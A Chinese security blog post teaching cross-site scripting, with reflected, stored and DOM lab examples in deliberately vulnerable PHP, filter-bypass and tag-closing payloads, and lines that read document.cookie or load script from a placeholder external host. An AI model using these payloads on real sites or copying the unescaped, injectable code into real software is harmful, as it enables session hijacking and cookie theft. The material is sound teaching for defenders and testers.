@@ -1,0 +1,804 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>web安全-XSS | Wisejay | To be better</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="web安全">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Wisejay</h5>
+          <a href="mailto:1418084893@qq.com" title="1418084893@qq.com" class="mail">
+            
+              <span>1</span>
+            
+              <span>4</span>
+            
+              <span>1</span>
+            
+              <span>8</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>4</span>
+            
+              <span>8</span>
+            
+              <span>9</span>
+            
+              <span>3</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>web安全-XSS</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">web安全-XSS</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-02-01T15:35:40.606Z" itemprop="datePublished" class="page-time">
+  2021-02-01
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web安全/">web安全</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-XSS"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">web安全-XSS</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-02-01 23:35:40" datetime="2021-02-01T15:35:40.606Z"  itemprop="datePublished">2021-02-01</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web安全/">web安全</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><blockquote>
+<p>Author:<code>wisejay</code></p>
+<p>Email:<code>wisejay@foxmail.com</code></p>
+</blockquote>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>跨站脚本（cross site script，XSS），XSS 是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而把恶意代码嵌入到 web 页面中去。当别的用户访问都会执行相应的恶意代码。从而盗取用户cookie、劫持会话，钓鱼欺骗等攻击的方式。 </p>
+<h2 id="常用测试语句"><a href="#常用测试语句" class="headerlink" title="常用测试语句"></a>常用测试语句</h2><ul>
+<li><code>&lt;script&gt;</code>标签是最直接的 XSS 有效载荷，脚本标记可以引用外部的 JavaScript 代码，也可以将代码插入脚本标记中 </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt; #弹窗xss</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;#获取cookie</span><br><span class="line">&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;#引用外部js</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>img</code>标签</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&apos;xss&apos;)&gt;#弹窗</span><br><span class="line">&lt;img src=1 onerror=document.body.appendChild(document.createElement(&apos;script&apos;)).src=&quot;http://xxx.com/xss.js&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>其他标签</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onclick=alert(&apos;xss&apos;)&gt;#点击弹窗</span><br><span class="line">&lt;input onfocus=alert(&apos;xss&apos;)&gt;#聚焦弹窗</span><br><span class="line">&lt;input onmouseover=alert(&apos;xss&apos;)&gt;#鼠标移动到指定位置弹窗</span><br><span class="line">&lt;body onload=alert(&apos;xss&apos;)&gt;#页面加载时弹窗</span><br><span class="line">&lt;a href=javascript:alert(/img/xss/1)&gt;XXX&lt;/a&gt;#点击XXX弹窗</span><br></pre></td></tr></table></figure>
+
+<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p><code>反射型也称作非持久型，主要用于将恶意脚本插入到URL地址参数中，即每次攻击都需要用户点击，通常结合社会工程学进行攻击</code></p>
+<p>正常发送信息：<code>http:127.0.0.1/xss.php?name=wisejay</code></p>
+<p>反射型XSS攻击：<code>http:127.0.0.1/xss.php?name=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
+<blockquote>
+<p>打开者如果弹窗显示XSS，则说明存在反射型XSS</p>
+</blockquote>
+<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a><strong>实例</strong></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//前端1.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>反射型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"xss.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//后端xss.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $name=$_POST[<span class="string">"name"</span>];</span><br><span class="line">	<span class="keyword">echo</span> $name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597249147737.png" title="1597249147737" data-fancybox="images"><img src="/img/xss/1597249147737.png" alt="1597249147737" title class></a>
+                <p>1597249147737</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597249160807.png" title="1597249160807" data-fancybox="images"><img src="/img/xss/1597249160807.png" alt="1597249160807" title class></a>
+                <p>1597249160807</p>
+            </figure>
+
+<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p><code>存储型也称作持久型，这类XSS攻击，不需要用户点击特定的URL，因为攻击者是将恶意代码插入服务器(数据库)中，当用户浏览相应的网页时就会触发</code></p>
+<p>这类型的XSS一般存在留言板中</p>
+<p>如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">value</span>=<span class="string">“这里是用户填写的数据</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>但用户传入value参数为:<code>&lt;script&gt;alert(‘xss’)&lt;/script&gt;</code>就会存储到数据库中，访问时就会被触发。</p>
+</blockquote>
+<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//创建数据库</span><br><span class="line">create database test;</span><br><span class="line">use test;</span><br><span class="line">create table xss(</span><br><span class="line">id int(3) not null,</span><br><span class="line">name varchar(200) not null,</span><br><span class="line">primary key(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//2.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>存储型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"save.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            输入你ID:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"id"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            输入你NAME:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//save.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $id=$_POST[<span class="string">"id"</span>];</span><br><span class="line">	$name=$_POST[<span class="string">"name"</span>];</span><br><span class="line">	mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">	mysql_select_db(<span class="string">"test"</span>);</span><br><span class="line">	</span><br><span class="line">	$sql=<span class="string">"insert into xss value ($id,'$name')"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//show.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$id=$_GET[<span class="string">"id"</span>];</span><br><span class="line">	mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">	mysql_select_db(<span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">	$sql=<span class="string">"select name from xss where id=$id"</span>;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">    <span class="keyword">while</span>($row=mysql_fetch_array($result))&#123; </span><br><span class="line">      <span class="keyword">echo</span> $row[<span class="string">'name'</span>]; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;script&gt;alert(\&#39;xss\&#39;)&lt;/script&gt;</code>\用来转义</p>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597249586099.png" title="1597249586099" data-fancybox="images"><img src="/img/xss/1597249586099.png" alt="1597249586099" title class></a>
+                <p>1597249586099</p>
+            </figure>
+
+<p>查看数据库插入情况发现刚刚语句被插入到数据库中啦</p>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597251966287.png" title="1597251966287" data-fancybox="images"><img src="/img/xss/1597251966287.png" alt="1597251966287" title class></a>
+                <p>1597251966287</p>
+            </figure>
+
+<p>在查看页面查看数据<code>http://127.0.0.1/xss/show.php?id=1</code>发现语句被成功执行</p>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597252051220.png" title="1597252051220" data-fancybox="images"><img src="/img/xss/1597252051220.png" alt="1597252051220" title class></a>
+                <p>1597252051220</p>
+            </figure>
+
+<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p><code>DOM型是一种特殊的非持久型，用户能够通过交互修改浏览器页面中的 DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞</code></p>
+<p>payload:<code>http://127.0.0.1/dom.php?name=&lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;</code></p>
+<blockquote>
+<p>当用户访问时，服务器就会返回包含恶意脚本的HTML静态文本，浏览器会把HTML解析成DOM，等于在网页直接插入</p>
+</blockquote>
+<h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//3.html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>DOM型<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"dom.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//dom.php</span><br><span class="line">&lt;?php</span><br><span class="line">	$name=$_POST[&quot;name&quot;];	</span><br><span class="line">?&gt;</span><br><span class="line">&lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $name;?&gt;&quot;/&gt;</span><br><span class="line">&lt;div id=&quot;print&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var text=document.getElementById(&quot;text&quot;);</span><br><span class="line">    var print=document.getElementById(&quot;print&quot;);</span><br><span class="line">    print.innerHTML=text.value;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597252179215.png" title="1597252179215" data-fancybox="images"><img src="/img/xss/1597252179215.png" alt="1597252179215" title class></a>
+                <p>1597252179215</p>
+            </figure>
+
+<figure class="image-box">
+                <a rel=web安全-XSS href="/img/xss/1597252486630.png" title="1597252486630" data-fancybox="images"><img src="/img/xss/1597252486630.png" alt="1597252486630" title class></a>
+                <p>1597252486630</p>
+            </figure>
+
+<h3 id="三者区别"><a href="#三者区别" class="headerlink" title="三者区别"></a>三者区别</h3><table>
+<thead>
+<tr>
+<th align="center">XSS类型</th>
+<th align="center">反射型</th>
+<th align="center">存储型</th>
+<th align="center">DOM型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">触发过程</td>
+<td align="center">正常用户访问携带XSS恶意脚本的URL</td>
+<td align="center">正常用户访问黑客恶意构造存储在数据库输出的地方</td>
+<td align="center">正常用户访问携带XSS恶意脚本的URL</td>
+</tr>
+<tr>
+<td align="center">数据存储</td>
+<td align="center">URL</td>
+<td align="center">数据库</td>
+<td align="center">URL</td>
+</tr>
+<tr>
+<td align="center">谁来输出</td>
+<td align="center">前端web程序</td>
+<td align="center">前端web程序</td>
+<td align="center">前端JavaScript</td>
+</tr>
+<tr>
+<td align="center">输出位置</td>
+<td align="center">HTTP响应中</td>
+<td align="center">HTTP响应中</td>
+<td align="center">动态构造的DOM结点</td>
+</tr>
+<tr>
+<td align="center">数据流向</td>
+<td align="center">前端–&gt;后端–&gt;前端</td>
+<td align="center">前端–&gt;后端–&gt;数据库–&gt;后端–&gt;前端</td>
+<td align="center">前端–&gt;浏览器</td>
+</tr>
+</tbody></table>
+<h2 id="XSS绕过和闭合"><a href="#XSS绕过和闭合" class="headerlink" title="XSS绕过和闭合"></a>XSS绕过和闭合</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p><code>&lt;ImG SrC=1 OnerRor=alert(&#39;xss&#39;)&gt;</code></p>
+<h4 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h4><p><code>&lt;imimgg srsrcc=1 onerror=alert(&#39;xxs&#39;)&gt;</code></p>
+<h4 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h4><p><code>&lt;img src=1 onerror=alert(</code>`xss`<code>)&gt;</code></p>
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>URL编码、Base64编码等</p>
+<h3 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h3><h4 id="能闭合标签"><a href="#能闭合标签" class="headerlink" title="能闭合标签"></a>能闭合标签</h4><ul>
+<li>用户输入作为HTML注释内容</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用户输入内容 --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>--&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;!--</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- --&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!-- --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用户输入作为标签属性名</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> 用户输入=<span class="string">"xxx"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>&lt;/div&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;div a</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">"xxx"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用户输入作为标签属性值</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"用户输入"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;div a=&quot;x</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">"x"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用户输入作为标签名</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">用户输入</span> <span class="attr">id</span>=<span class="string">"xx"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;b</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">id</span>=<span class="string">"xx"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用户输入作为CSS内容</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span>用户输入内容<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>&lt;/style&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;style&gt;</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="不能闭合标签"><a href="#不能闭合标签" class="headerlink" title="不能闭合标签"></a>不能闭合标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">'输入内容'</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<code>&#39; onfocus=&#39;alter(/img/xss/xss/)</code></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">''</span> <span class="attr">onfocus</span>=<span class="string">'alter(/img/xss/xss/)'</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="工具使用-Beef"><a href="#工具使用-Beef" class="headerlink" title="工具使用(Beef)"></a>工具使用(Beef)</h2><blockquote>
+<p>以kali系统为准</p>
+</blockquote>
